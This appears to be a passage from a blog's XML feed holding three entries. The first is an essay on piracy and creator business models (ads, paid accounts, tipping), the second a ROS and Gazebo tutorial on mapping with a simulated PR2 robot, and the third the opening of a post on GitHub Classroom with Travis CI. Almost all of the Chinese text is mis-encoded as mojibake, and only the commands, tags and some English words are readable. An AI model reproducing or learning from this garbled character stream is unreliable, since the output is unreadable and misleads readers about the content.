å…è²»æ™‚ä»£ä¾†è‡¨ï¼Ÿåœ¨ç¶²éš›ç¶²è·¯æ™®åŠä¹‹å¾Œï¼Œç›œç‰ˆè»Ÿé«”è®Šå¾—è¶Šä¾†è¶ŠçŒ–ç—ï¼ŒåŸºæœ¬ä¸Šæ‰€æœ‰çŸ¥åçš„å•†æ¥­ä½œå“ä¸€å®šéƒ½æœ‰å®ƒçš„ç›œç‰ˆï¼Œæ¼¸æ¼¸çš„ï¼Œè³¼è²·æ­£ç‰ˆå·²ç¶“æˆç‚ºä¸€ç¨®é¡å¤–çš„æ”¯æŒè¡Œç‚ºï¼Œè¬›é›£è½é»ï¼Œæ˜¯ä¸€ç¨®ã€Œæ–½æ¨ã€ï¼Œè€Œä¸æ˜¯æ­£å¸¸æ¶ˆè²»é€”å¾‘äº†ã€‚
è»Ÿé«”é–‹ç™¼å•†é–‹å§‹æ³¨æ„åˆ°é€™å€‹å•é¡Œï¼Œæ–¼æ˜¯ä»–å€‘é–‹å§‹ç”¨ä¸€ç¨®æˆªç„¶ä¸åŒçš„å•†æ¥­æ¨¡å¼â€”å…è²»ã€‚å¾ YouTubeã€Google æœå°‹å¼•æ“ ï¼Œåˆ° LINEã€Facebook ï¼Œæ‰“é–‹ Play å•†åº—ï¼Œå¤§éƒ¨åˆ†çš„ app ä¹Ÿéƒ½æ˜¯å…è²»çš„ï¼Œå®ƒå€‘ä¾é è‘—å»£å‘Šå•†è³ºéŒ¢ã€‚
ä½ æœ‰æƒ³éç‚ºä»€éº¼ Facebook å…è²»å—ï¼Ÿå› ç‚ºä½ å°å®ƒæœ‰åƒ¹å€¼ï¼Œä½ çš„åŠ å…¥æœƒè®“ä½ çš„æ›´å¤šæœ‹å‹å–œæ­¡ä½¿ç”¨ï¼Œä¹Ÿå°±æœƒè®“å»£å‘Šè¢«æ›´å¤šäººçœ‹è¦‹ï¼Œå®ƒå°±èƒ½è³ºæ›´å¤šéŒ¢ã€‚
ç•¶ä½ ä½¿ç”¨ä¸€å€‹å…è²»è»Ÿé«”ï¼Œå¤šåŠä»£è¡¨ä½ å°è»Ÿé«”å…¬å¸æœ‰åƒ¹å€¼ï¼Œä½ å°±æ˜¯ä»–å€‘çš„ç”¢å“ä¹‹ä¸€ï¼Œå› æ­¤ä½ å¾—ä»¥å…è²»ã€‚æ‰€ä»¥æ‰æœƒæœ‰äººèªªã€Œå…è²»çš„æœ€è²´ã€é€™é¡çš„è©±ã€‚
ä»˜è²»å¸³è™Ÿ â€”å…¼å…·å…è²»èˆ‡ä»˜è²»çš„è§£æ³•å¦‚æœæˆ‘çœŸçš„ä¸æƒ³è¦å»£å‘Šå‘¢ï¼Ÿç¾åœ¨é‚„æœ‰ã€Œä»˜è²»å¸³è™Ÿã€é€™ç¨®è§£æ³•ï¼Œä¾‹å¦‚ Medium, Pocket, GitHub ç­‰å…¬å¸ï¼Œåœ¨é™¤äº†æä¾›å…è²»æœå‹™å¤–ï¼Œå¦å¤–æä¾›äº†ã€Œä»˜è²»ç‰ˆå¸³è™Ÿã€ï¼Œè®“æƒ³è¦æ›´å¤šåŠŸèƒ½çš„ä½¿ç”¨è€…å¯ä»¥è³¼è²·ä»˜è²»ç‰ˆï¼Œé€™æ¨£æ—¢èƒ½ä¿æŒä¸å—å»£å‘Šæ§åˆ¶ï¼Œåˆèƒ½æœ‰ç¶“æ¿Ÿæ”¶å…¥ã€‚
ä½†ä»˜è²»ç‰ˆå¸³è™Ÿå°±ä¸æœƒè¢«ç›œç‰ˆå—ï¼Ÿï¼Œäº‹å¯¦ä¸Šï¼Œæ¯”è¼ƒé›£ã€‚ç¾ä»£çš„å„ç¨®ä»˜è²»å•†æ¥­æ¨¡å¼å¤šåŠæ˜¯æ¡ã€Œå¸³è™Ÿåˆ¶ã€ï¼Œä¹Ÿå°±æ˜¯ä½ è³¼è²·çš„æ˜¯ä¸€å€‹å¸³è™Ÿã€‚åªè¦æ˜¯å¸³è™Ÿï¼Œå°±æ¯”è¼ƒå¥½æ§åˆ¶ï¼Œå› ç‚ºè³‡æ–™åœ¨å…¬å¸å…§éƒ¨çš„ä¼ºæœå™¨ï¼Œå¦‚æœæœå‹™æ˜¯åœ¨ç¶²é ä¸Šçš„è©±æ›´æ˜¯å¦‚æ­¤ï¼Œä½¿ç”¨è€…ç„¡æ³•å–å¾—å®Œæ•´çš„ç¨‹å¼ï¼ˆåªèƒ½å¤ å–å¾—å–®ä¸€ç¶²é çš„ HTMLã€JavaScript â€¦ï¼‰ï¼Œä¹Ÿå°±æ¯”è¼ƒé›£è¢«é€†å‘æˆ–æ˜¯ç ´è§£ï¼Œå› ç‚ºæ‰€æœ‰çš„ç¨‹å¼ç¢¼éƒ½åœ¨å…¬å¸è‡ªå·±çš„ä¼ºæœå™¨ä¸­ã€‚
æƒ³æƒ³çœ‹ï¼Œä½ ä¸€å®šæœ‰è½éç›œç‰ˆçš„å¨åŠ›å°æ¼”ã€ç›œç‰ˆçš„ Windowsï¼Œä½†ä½ æœ‰è½é ç›œç‰ˆçš„ YouTube å—ï¼Ÿç›œç‰ˆçš„ Mediumï¼Ÿç›œç‰ˆçš„ GitHubï¼Ÿæˆ‘ç›¸ä¿¡ä½ æ²’æœ‰ï¼Œå› ç‚ºå°‡å¸³è™Ÿè³‡æ–™æ”¾åœ¨ä¼ºæœå™¨ï¼ŒåŸºæœ¬ä¸Šå°±èƒ½å¤ é¿å…ç„¡é™é‡è¤‡è£½ï¼Œå› ç‚ºæœå‹™æ˜¯ã€Œèªå¸³è™Ÿã€ï¼Œä½ æ²’æœ‰å¸³è™Ÿï¼Œç©ºæœ‰ç¨‹å¼ä¹Ÿæ²’ç”¨ã€‚äº‹å¯¦ä¸Šï¼Œç¾åœ¨è¨±å¤š YouTuber ä½¿ç”¨çš„ä»˜è²»è¨‚é–± PressPlay å°±æ˜¯æ¡ç”¨å¸³è™Ÿåˆ¶ï¼Œå…§å®¹éƒ½åœ¨ PressPlay çš„ä¼ºæœå™¨ï¼Œå®ƒå¯ä»¥ä¾æ“šä½ å¸³è™Ÿçš„ç‹€æ…‹ä¾†æ±ºå®šæ˜¯å¦è¦çµ¦ä½ å…§å®¹ï¼Œå› æ­¤ä½ å¾ˆé›£ç›œç‰ˆã€‚è€Œæœ‰åçš„ä»˜è²»éŠæˆ²â€” Minecraft ä¹Ÿæ˜¯æ¡å¸³è™Ÿåˆ¶ï¼Œé€™æ¨£å¯ä»¥æ–¹ä¾¿ä½¿ç”¨è€…åœ¨ä¸åŒè¨­å‚™é·ç§»ï¼Œè€Œä¸”ç®¡æ§ç°¡å–®ã€‚
å¤§æ–—å…§æ™‚ä»£ï¼Œå¯èƒ½å—ï¼Ÿä½†å³ä½¿æ˜¯ä¸Šè¿°æ‰€èªªçš„ä»˜è²»å¸³è™Ÿåˆ¶åº¦ï¼Œä»ç„¶æ˜¯æœ‰å¯èƒ½è¢«ç›œç‰ˆçš„ï¼Œå› æ­¤åœ¨éå»è¨±å¤šè»Ÿé«”é–‹ç™¼å•†è¨­è¨ˆå¾ˆå¤šæ•¸ä½é–ï¼Œæƒ³è¦é˜²æ­¢è¢«ç›œç‰ˆï¼Œä½† æ­·å²è­‰æ˜ï¼Œéƒ½æ²’æœ‰ç”¨ã€‚é–‹ç™¼æ•¸ä½é–æµªè²»äº†è»Ÿé«”é–‹ç™¼å•†çš„å¤§ç­†æ™‚é–“å’Œé‡‘éŒ¢ï¼Œä½†æœ€å¾Œé–ä½çš„ï¼Œå»å¾€å¾€æ˜¯æœ‰è‰¯å¿ƒä¹–ä¹–è²·æ­£ç‰ˆçš„ä½¿ç”¨è€…ã€‚
å› æ­¤æœ‰äººé–‹å§‹æå‡ºäº†æ–°çš„è§£æ±ºæ–¹æ¡ˆï¼Œçè³åˆ¶åº¦ï¼Œä½ å¯ä»¥å…è²»çš„ä½¿ç”¨ï¼Œä½†å¦‚æœä½ å–œæ­¡ï¼Œè«‹ä½ çµ¦æˆ‘ä¸€é»å ±é…¬ã€‚é€™æ¨£çš„æ–¹å¼é–‹å§‹é€æ¼¸çš„æµè¡Œï¼Œä¹‹æ‰€ä»¥å´›èµ·ï¼Œå¾ˆå¤§ç¨‹åº¦æ˜¯å› ç‚ºã€Œç¶²è·¯çš„æ›´ç™¼é”ï¼Œè®“ç·šä¸Šæ”¯ä»˜çš„é–€æª»é™ä½äº†ã€ã€‚
ç•¶ä½ åœ¨è¡—ä¸Šçœ‹åˆ°ä¸€ä½å„ªç§€çš„è¡—é ­è—äººï¼Œä½ è½å®Œäº†ä»–çš„è¡¨æ¼”ï¼Œè¦ºå¾—å¾ˆä¸éŒ¯ã€å¾ˆç²¾å½©ï¼Œæ–¼æ˜¯å°±çµ¦äº†ä»–åå¡ŠéŒ¢ï¼Œé€™å¾ˆå®¹æ˜“ï¼Œå› ç‚ºåå¡ŠéŒ¢å°ä½ ä¾†èªªæ˜¯å°éŒ¢ï¼Œè€Œã€Œå°‡éŒ¢æŠ•å…¥å¸½å­ä¸­ã€é€™å€‹å‹•ä½œåˆååˆ†çš„ç°¡å–®ã€‚
ä½†å¦‚æœä½ ä»Šå¤©åœ¨ç¶²è·¯ä¸Šçœ‹åˆ°ä¸€å€‹å‰µä½œè€…çš„å½±ç‰‡ï¼Œä»–çš„å…§å®¹ä¸€æ¨£å¾ˆç²¾å½©ï¼Œä½ ä¸€æ¨£æƒ³çµ¦ä»–å›é¥‹ï¼Œä½†å¦‚æœä½ æ²’è¾¦æ³•ç”¨éå¸¸ç°¡å–®çš„æ–¹å¼çµ¦ä»–åå¡ŠéŒ¢ï¼Œä½ å¾ˆå¯èƒ½æœƒæ‰“æ¶ˆå¿µé ­ã€‚ç•¶ä½ æƒ³åˆ°ä½ å¯èƒ½éœ€è¦è¨­å®šä¿¡ç”¨å¡ï¼Œæˆ–æ˜¯åˆ°ä¾¿åˆ©è¶…å•†ä»˜æ¬¾ï¼Œç”šè‡³æ˜¯å°å®‰å…¨çš„éš±æ†‚ï¼Œä½ å¯èƒ½å°±å› ç‚ºæ€•éº»ç…©è€Œç®—äº†ï¼Œå¿ƒç†é»˜é»˜ç‚ºä»–æ„Ÿåˆ°å¯æƒœï¼Œã€Œå‡å¦‚å¯ä»¥æ›´ç°¡å–®ä¸€é»ï¼Œæˆ‘å°±é¡˜æ„çµ¦ä½ å ±é…¬äº†ã€ã€‚
ä½†åœ¨è¿‘å¹´ä¾†ï¼Œç·šä¸Šæ”¯ä»˜é–‹å§‹è®Šå¾—ä¾¿åˆ©è€Œå®‰å…¨ï¼Œé€™å€‹é–€æª»æœ‰è¶Šä¾†è¶Šä½çš„è¶¨å‹¢ï¼›è€ŒåŠ å¯†è²¨å¹£çš„èˆˆèµ·ï¼Œä¹Ÿè®“æœªä¾†ç¶²è·¯çš„æ”¯ä»˜æœ‰æ–°çš„å¯èƒ½ã€‚å› æ­¤é–‹å§‹æœ‰ Matters é€™ç¨®ï¼Œå‰µä½œå…¬é–‹ï¼Œä½†èƒ½ä½¿å‰µä½œè€…æœ‰å›å ±çš„å¹³å°å‡ºç¾ã€‚  
æ¡ˆä¾‹ç ”ç©¶ï¼šElementary OSã€å¥½å’Œå¼¦Elementary OS ï¼ˆä»¥ä¸‹ç°¡ç¨± Elementaryï¼‰æ˜¯ä¸€å€‹é–‹æºçš„ Linux ç™¼è¡Œç‰ˆï¼Œå®ƒæ˜¯å®Œå…¨é–‹æºçš„ï¼Œä½†å¸Œæœ›ä½ èƒ½å¤ ä»˜è²»ä¸‹è¼‰ï¼Œäº‹å¯¦ä¸Šï¼Œå®ƒè®“ä½ è‡ªå·±æ±ºå®šè¦èŠ±å¤šå°‘éŒ¢è³¼è²·å®ƒï¼ŒåŒ…æ‹¬ 0 å…ƒã€‚
åœ¨å®ƒçš„è»Ÿé«”å•†åº— AppCenterï¼Œæœ‰ä¸€äº›ç”±ä»–å€‘æ‰€è£½ä½œçš„è»Ÿé«”ï¼Œæœƒæ ¹æ“šä»–å€‘çš„çœ‹æ³•æ¨™ä¸€å€‹å»ºè­°åƒ¹æ ¼ï¼Œä½†ä½ ä»ç„¶å¯ä»¥è‡ªå·±æ±ºå®šè¦èŠ±å¤šå°‘ â€”Nicechord å¥½å’Œå¼¦ï¼Œä»–åšçš„æ˜¯éŸ³æ¨‚å‰µä½œã€æ¨‚ç†æ•™å­¸ï¼Œå…§å®¹è³ªé‡éå¸¸é«˜ï¼Œä½†ä»–ä¸¦æ²’æœ‰é–‹å•Ÿ YouTube ç‡Ÿåˆ©åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯ä»–çš„å½±ç‰‡ä¸¦æ²’æœ‰æ”¶å»£å‘Šè²»ç”¨ï¼Œä»–æ˜¯é è³£ã€Œå®¶åº­è™Ÿå¤§åŒ…è£ã€ä¾†ç‡Ÿåˆ©ï¼Œè€Œå®¶åº­è™Ÿå¤§åŒ…è£çš„å…§å®¹é€šé€šéƒ½åœ¨ YouTube ä¸Šã€‚è€Œåƒ¹æ ¼ä¹Ÿå¾ˆè‡ªç”±ï¼Œæ˜¯ã€Œä¸€å¡Šç¾é‡‘ä»¥ä¸Šçš„ä»»æ„åƒ¹æ ¼ã€ï¼Œé€™æ¨£æ—¢å…äº†ç›œç‰ˆçš„å•é¡Œï¼ˆå› ç‚ºæ‰€æœ‰å…§å®¹éƒ½å¯ä»¥åœ¨ YouTube å…è²»å–å¾—ï¼‰ï¼Œè€Œä¸”å¯ä»¥å¾—åˆ°æ”¶å…¥ï¼Œåˆèƒ½æœ‰è‘—ç›¸ç•¶å¥½çš„å½¢è±¡ï¼Œæˆ‘èªç‚ºæ˜¯ç›¸ç•¶æœ‰æ™ºæ…§çš„å•†æ¥­æ¨¡å¼ã€‚
ä½†çè³åˆ¶åº¦çš„æœ€å¤§å›°å¢ƒåœ¨æ–¼æ”¶å…¥çš„ä¸ç©©å®šï¼Œä¸”éœ€è¦ä¾†è‡ªè‰¯å¥½çš„å½¢è±¡ã€‚æ­£å¦‚åŒè¡—é ­è—äººæ²’è¾¦æ³•æœ‰ç›¸ç•¶ç©©å®šçš„æ”¶å…¥ï¼Œä¾è³´ææ¬¾æˆ–æ˜¯ã€Œçè³ã€çš„æ”¶å…¥ä¹Ÿå¾ˆé›£é æ¸¬ï¼Œæˆ–è¨±ç•¶ç¶“æ¿Ÿè®Šå¾—è•­æ¢æ™‚ï¼Œäººå€‘å°±æœƒæ¸›å°‘é€™é¡çš„æ”¯å‡ºï¼Œå°è‡´æ”¶å…¥è®Šå°‘ï¼Œé€™ä¹Ÿæ˜¯ç¾åœ¨æ¯”è¼ƒé›£å…‹æœçš„å•é¡Œã€‚
å‰µä½œè€…çš„æœªä¾†åœ¨ç¶“æ­·äº†ç¶²è·¯å¿«é€Ÿç™¼å±•å¾Œï¼Œè®“ä»˜è²»çš„è»Ÿé«”é–‹å§‹ç„¡æ³•ç¹¼çºŒç”Ÿå­˜ï¼Œé€æ¼¸è¢«å…è²»è»Ÿé«”å–ä»£ã€‚ä½†åœ¨é€æ¼¸é‡è¦–éš±ç§æ¬Šçš„ä»Šå¤©ï¼Œå»£å‘Šæ”¶ç›Šæ¨¡å¼åˆè¶Šä¾†è¶Šå—åˆ°è©¬ç—…ï¼Œè€Œå…¶å¸¶ä¾†çš„æµé‡å–å‘ã€å…§å®¹æ•—å£ç­‰å•é¡Œï¼Œä¹Ÿè®“å‰µä½œè€…è¶Šä¾†è¶Šé›£ä»¥ç”Ÿå­˜ã€‚
ä½†è¿‘ä¾†æœ‰äº†æ–°çš„è½‰æ©Ÿï¼Œç§‘æŠ€çš„é€²æ­¥è®“ç·šä¸Šæ”¯ä»˜è®Šå¾—æ›´åŠ è¼•æ˜“ï¼Œæˆ–è¨±åœ¨ä¸ä¹…çš„å°‡ä¾†ï¼Œç·šä¸Šæ”¯ä»˜ã€åŠ å¯†è²¨å¹£çš„ç™¼å±•ä½¿å¾—ã€Œè®šè³ã€è®Šå¾—åƒæŠŠç¡¬å¹£ä¸Ÿé€²å¸½å­ä¸€èˆ¬ç°¡å–®ï¼Œé‚£æ™‚åˆ©ç”¨ç¶²è·¯çš„å‚³æ’­èƒ½åŠ›ï¼Œå…¶æ”¶å…¥çµ•å°ä¸æ˜¯è¡—é ­è—äººå¯ä»¥æ¯”æ“¬çš„ã€‚
å¥—ä¸€å¥å›§æ˜Ÿäººåœ¨ &lt;ç›œç‰ˆçš„æœªä¾†&gt; å½±ç‰‡ä¸­æ‰€èªªçš„è©±ï¼š

é€™å°‡æœƒæ˜¯å€‹å‰µä½œè€…çš„å¤§å¥½æ™‚ä»£

å°æ­¤ï¼Œæˆ‘æ„Ÿåˆ°ååˆ†æœŸå¾…ã€‚
å»¶ä¼¸é–±è®€é€™æ¬¡çš„æ–‡ç« ï¼Œæˆ‘å¾ˆå¤§çš„å•Ÿç™¼æ˜¯ä¾†è‡ªæ–¼å›§æ˜Ÿäºº &lt;ç›œç‰ˆçš„æœªä¾†&gt; é€™æ”¯å½±ç‰‡ï¼›è€Œ INSIDE æ–‡ç«  &lt;å¾ä»˜è²»åˆ°å…è²»å†åˆ°è£œè²¼ â€”â€” å•†æ¥­æ¨¡å¼è®Šé·çš„åº•å±¤é‚è¼¯&gt; è®“æˆ‘å°æ–¼å•†æ¥­æ¨¡å¼è®Šé·çš„å¯¦éš›åŸå› æœ‰äº†æ›´æ·±å…¥çš„äº†è§£ï¼Œå…©è€…éƒ½æœ‰éå¸¸ç²¾é—¢çš„å…§å®¹ï¼Œå¼·åŠ›æ¨è–¦ã€‚ç›œç‰ˆçš„æœªä¾†ï½œè³‡è¨Šåˆ†äº«ï¼Œé–å¾—ä½ï¼Ÿâ€”å†æ˜Ÿäººå¾ä»˜è²»åˆ°å…è²»å†åˆ°è£œè²¼ â€”â€” å•†æ¥­æ¨¡å¼è®Šé·çš„åº•å±¤é‚è¼¯   
é—œæ–¼ä½œè€…æ—å®ä¿¡ lancatlinï¼Œåœ‹ä¸­ç”Ÿã€æ¥­é¤˜è»Ÿé«”å·¥ç¨‹å¸«ï¼Œç¶“ç‡Ÿéƒ¨è½æ ¼ WANcatServer ç¶²è²“ä¼ºæœå™¨   
]]></content>
      <tags>
        <tag>å•†æ¥­æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨ Gazebo æ¨¡æ“¬å™¨æ§åˆ¶æ©Ÿå™¨äººå»ºç«‹ 2D åœ°åœ–</title>
    <url>/2016/08/06/gazebo-robot-2d-map/</url>
    <content><![CDATA[å‰è¨€ROS å¾ˆå¸å¼•äººçš„ä¸€å€‹åœ°æ–¹åœ¨æ–¼ï¼Œä»–è·Ÿæ¨¡æ“¬å™¨ Gazebo å¾ˆå¥½åœ°çµåˆåœ¨ä¸€èµ·ï¼Œè®“ä½¿ç”¨è€…å¯ä»¥ä½¿ç”¨ä¸€å°ç­†è¨˜å‹é›»è…¦å°±é–‹å§‹æ’°å¯«æ©Ÿå™¨äººç¨‹å¼ï¼Œè€Œä¸”å¯ä»¥åœ¨ç­†é›»ä¸Šçœ‹åˆ°ç¨‹å¼åŸ·è¡Œçš„çµæœã€‚æ¨¡æ“¬å™¨è£¡çš„æ©Ÿå™¨äººä¸æœƒæ’å£ã€ä¸æœƒæ²’é›»ï¼Œæ‰€ä»¥å°±ç®—åœ¨ç¨‹å¼è¨­è¨ˆéç¨‹ä¸­æœ‰éŒ¯èª¤ï¼Œä¹Ÿä¸æœƒæœ‰ä»»ä½•ç¡¬é«”æˆæœ¬çš„æå¤± (æ™‚é–“ç•¶ç„¶æ˜¯æœƒæå¤±)ï¼Œè€Œä¸”å¾ˆå®¹æ˜“å¤§é‡æ¸¬è©¦æ¼”ç®—æ³•ï¼Œå› ç‚ºå¯ä»¥åœ¨æ¨¡æ“¬å™¨ä¸­è¨­ç½®å„ç¨®å ´æ™¯ï¼Œè€Œä¸éœ€è¦ä¸€å€‹å¾ˆå¤§çš„ç©ºé–“å’Œæ˜‚è²´çš„æ©Ÿå™¨äººã€‚é€™ç¯‡æ–‡ç« æœƒç°¡å–®ä»‹ç´¹æ€éº¼åœ¨ Gazebo è£¡é¢å•Ÿå‹• PR2ï¼Œä¸¦é™æ§ä»–ä¾†å»ºç«‹ä¸€å€‹ 2D çš„åœ°åœ–ã€‚
å•Ÿå‹• Gazebo è·Ÿ PR2æˆ‘çš„æ¸¬è©¦ç’°å¢ƒæ˜¯ Ubuntu 14.04 + ROS Indigoï¼Œä¸éä½¿ç”¨çš„æŒ‡ä»¤éƒ½å¾ˆ generalï¼Œå³ä¾¿ä½ ä½¿ç”¨å…¶ä»–ç‰ˆæœ¬ï¼Œæ‡‰è©²ä¹Ÿä¸æœƒæœ‰ä»€éº¼å•é¡Œã€‚
é¦–å…ˆæˆ‘å€‘ç¢ºå®šå·²ç¶“å®‰è£æ‰€éœ€è¦çš„å¥—ä»¶ï¼š
sudo apt-get install ros-indigo-gazebo-*

æ¥ä¸‹ä¾†åœ¨çµ‚ç«¯æ©Ÿè¼¸å…¥ gazebo æ‡‰è©²å°±å¯ä»¥æˆåŠŸå•Ÿå‹• Gazebo æ¨¡æ“¬å™¨ã€‚ç„¶å¾Œæˆ‘å€‘å¯ä»¥ç”¨ç¾æˆçš„ package å•Ÿå‹•ä¸€å€‹æœ‰ PR2 çš„ç©ºç™½æ¨¡æ“¬ç’°å¢ƒã€‚
roslaunch pr2_gazebo pr2_empty_world.launch

Gazebo è£¡é¢å·²ç¶“æœ‰å¾ˆå¤šç¾æˆçš„æ¨¡å‹ï¼Œé¸æ“‡å·¦é‚Šçš„ Insert é ç±¤ï¼Œè£¡é¢å°±å¯ä»¥æ‰¾åˆ°ä¸€äº›ç¾æˆçš„æ¨¡å‹ï¼Œåœ¨é€™é‚Šæˆ‘å…ˆåŠ å…¥äº† Cube è·Ÿ Dumpster çš„æ¨¡å‹ï¼ŒåŠ å…¥å¾Œçš„çµæœå¦‚ä¸‹åœ–ï¼š

å°æ–¼æ©Ÿå™¨äººä¾†èªªï¼Œæœ€é‡è¦çš„ç¬¬ä¸€å€‹ç’°ç¯€å°±æ˜¯æ„ŸçŸ¥åŠŸèƒ½ï¼Œä»–å¿…é ˆè¦å¯ä»¥æ„ŸçŸ¥ç’°å¢ƒä¸­çš„è³‡è¨Šï¼Œæ‰èƒ½åšå‡ºç›¸å°æ‡‰çš„å‹•ä½œã€‚æ‰€ä»¥æˆ‘å€‘æœƒå…ˆé—œå¿ƒçš„å°±æ˜¯ Gazebo è£¡é¢çš„ PR2 æ©Ÿå™¨äººå¯ä¸å¯ä»¥æ¥æ”¶åˆ°ç’°å¢ƒä¸­çš„è³‡è¨Šã€‚
ç­”æ¡ˆç•¶ç„¶æ˜¯å¯ä»¥çš„ï¼Œæˆ‘å€‘å¯ä»¥é€é ROS æä¾›çš„ visualizer Rviz ä¾†è§€çœ‹ PR2 æ¥æ”¶åˆ°çš„è³‡è¨Šï¼Œå¦‚æœæ˜¯å·²ç¶“ç†Ÿæ‚‰ ROS çš„è®€è€…ï¼Œæƒ³å¿…å° Rviz ä¸é™Œç”Ÿï¼Œåªè¦é–‹ä¸€å€‹æ–°çš„çµ‚ç«¯æ©Ÿï¼Œè¼¸å…¥ rviz å°±å¯ä»¥å•Ÿå‹•äº†ã€‚å•Ÿå‹•ä¹‹å¾Œï¼Œå¯ä»¥ Add ä¸€å€‹ Image çš„é¡¯ç¤ºæ¡†ï¼Œç„¶å¾Œé¸æ“‡ç¾åœ¨å¯ä»¥çœ‹åˆ°çš„ topicï¼Œå°±å¯ä»¥çœ‹åˆ° Gazebo è£¡é¢çš„ PR2 çœ‹åˆ°çš„ç•«é¢ã€‚

å•Ÿå‹• gmapping package å»ºåœ°åœ–ç’°å¢ƒéƒ½å·²ç¶“å•Ÿå‹•äº†ï¼Œæ¥ä¸‹ä¾†å°±è¦é–‹å§‹å»ºåœ°åœ–å•¦! é€™é‚Šæˆ‘å€‘ä½¿ç”¨çš„å·¥å…·æ˜¯ gmapping ï¼Œé¦–å…ˆæˆ‘å€‘åœ¨éš¨ä¾¿ä¸€å€‹è·¯å¾‘æ–°å¢ä¸€å€‹ launch æª” â€“  vim pr2_build_map.launch ã€‚
ç„¶å¾Œè¼¸å…¥é€™ä¸€ä¸²æ–‡å­—ï¼Œå„²å­˜æª”æ¡ˆå¾Œé›¢é–‹ã€‚
&lt;launch&gt;  &lt;!-- dynamic map generation --&gt;  &lt;node name=&quot;gmapping_node&quot; pkg=&quot;gmapping&quot; type=&quot;slam_gmapping&quot; respawn=&quot;false&quot; &gt;    &lt;remap to=&quot;base_scan&quot; from=&quot;scan&quot;/&gt;    &lt;param name=&quot;odom_frame&quot; value=&quot;odom_combined&quot; /&gt;  &lt;/node&gt;&lt;/launch&gt;

ç„¶å¾Œå¯ä»¥ç”¨ roslaunch pr2_build_map.launchå•Ÿå‹•ã€‚å•Ÿå‹• gmapping ä¹‹å¾Œï¼Œæˆ‘å€‘é‚„æ˜¯é€é Rviz ä¾†è§€çœ‹åœ°åœ–å»ºç«‹çš„ç‹€æ…‹ï¼Œé€™é‚Šéœ€è¦åŠ å…¥ Map çš„é¡¯ç¤ºï¼Œç„¶å¾Œ topic é¸æ“‡ &#x2F;map å°±å¥½ã€‚åœ°åœ–ä¸­çš„é»‘è‰²ç·šå°±æ˜¯éšœç¤™ç‰©ï¼Œæ·ºç°è‰²å€åŸŸè¡¨ç¤ºæ˜¯å¯ä»¥èµ°çš„ç„¡éšœç¤™ç‰©å€åŸŸï¼Œæ·±ç°è‰²å‰‡æ˜¯æœªçŸ¥å€åŸŸã€‚

è®“æˆ‘å€‘è¿‘çœ‹ä¸€ä¸‹ map çš„ topic è¦æ€éº¼é¸ï¼š

ä½†å¦‚æœæ©Ÿå™¨äººä¸èƒ½ç§»å‹•çš„è©±ï¼Œå°±åªèƒ½é¡¯ç¤ºçœ¼å‰çœ‹åˆ°çš„é€™ä¸€å¡Šåœ°åœ–ã€‚æ‰€ä»¥æˆ‘å€‘å…ˆä½¿ç”¨ç°¡å–®çš„é™æ§ç¨‹å¼ä¾†æ§åˆ¶ Gazebo è£¡é¢çš„ PR2 ç§»å‹•ã€‚
é€™é‚Šåªè¦å•Ÿå‹• teleop_keyborad å°±å¯ä»¥ç”¨éµç›¤æ§åˆ¶æ©Ÿå™¨äººç§»å‹•ï¼š
roslaunch pr2_teleop teleop_keyboard.launch

WASD å››å€‹æŒ‰éµåˆ†åˆ¥ä»£è¡¨å‰å·¦å¾Œå³å››å€‹æ–¹å‘çš„å¹³ç§»ã€QEå…©å€‹æŒ‰éµæ˜¯åŸåœ°æ—‹è½‰ï¼Œé€™é‚Šè¦æ³¨æ„å¿…é ˆé¸åˆ°å•Ÿå‹• teleop_keyboardçš„è¦–çª—ï¼ŒæŒ‰æŒ‰éµæ‰æœ‰ç”¨ã€‚ä½¿ç”¨ teleop ä¾†æ§åˆ¶ PR2 èµ°ä¸€èµ°ä¹‹å¾Œï¼Œå°±å¯ä»¥çœ‹å¾—å‡ºæˆ‘å€‘å·²ç¶“ä½¿ç”¨ gmapping å»ºç«‹äº†ä¸€å€‹çœ‹èµ·ä¾†æœ‰æ¨¡æœ‰æ¨£çš„åœ°åœ–äº†ã€‚

å¦‚æœä½ æƒ³è¦æŠŠåœ°åœ–å­˜èµ·ä¾†ï¼Œæä¾›æœªä¾†è¦åš Navigation ä½¿ç”¨ï¼Œæˆ–åªæ˜¯å–®ç´”æƒ³ç•™å€‹ç´€å¿µï¼Œå¯ä»¥ç”¨ä¸€å€‹æŒ‡ä»¤æŠŠåœ°åœ–å­˜èµ·ä¾† â€“ rosrun map_server map_saver ã€‚
ç¸½çµé€™ç¯‡æ–‡ç« è·Ÿå¤§å®¶ç°¡å–®ä»‹ç´¹æ€éº¼ä½¿ç”¨ Gazebo æ¨¡æ“¬å™¨ä¾†æ¨¡æ“¬æ©Ÿå™¨äººï¼Œä¸¦åˆ©ç”¨ä»–å¯¦éš›æ“ä½œäº†ä¸€å€‹å°å°çš„ SLAM åŠŸèƒ½ï¼Œä¹Ÿå»ºå‡ºäº†è‡ªå·±çš„ä¸€å¼µåœ°åœ–ã€‚æˆ‘å€‘èƒ½åˆ©ç”¨ Gazebo ä¾†åšçš„äº‹æƒ…ç•¶ç„¶é ä¸æ­¢æ–¼æ­¤ï¼Œä¸éæ™‚é–“æœ‰é™ï¼Œæˆ‘å€‘ä¸‹æ¬¡è¦‹ã€‚
å»¶ä¼¸é–±è®€
gmapping æ¼”ç®—æ³•åŸç†ç°¡ä»‹
SDF ç¶²ç«™ä¸­æ–‡ç‰ˆ

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨é›éŠè‡ªå·±çš„åŸ·è¡ŒåŠ›
]]></content>
      <tags>
        <tag>æ©Ÿå™¨äºº</tag>
        <tag>Robot</tag>
        <tag>ROS</tag>
        <tag>Gazebo</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ©ç”¨ Github Classroom åŠ  Travis CI æ‰“é€ æ”¹ä½œæ¥­ç³»çµ±</title>
    <url>/2018/02/03/github-classroom-and-travis-ci/</url>
    <content><![CDATA[å‰è¨€é€™é™£å­é–‹å§‹äº†ä¸€å€‹è‡ªå·±çš„ side projectï¼Œå«åšç¨‹å¼å°å¸«å¯¦é©—è¨ˆç•«ï¼Œå¸Œæœ›èƒ½åœ¨å››å€‹æœˆå…§æŠŠå­¸ç”ŸåŸ¹é¤Šæˆæ‰¾å¾—åˆ°å·¥ä½œçš„å·¥ç¨‹å¸«ã€‚
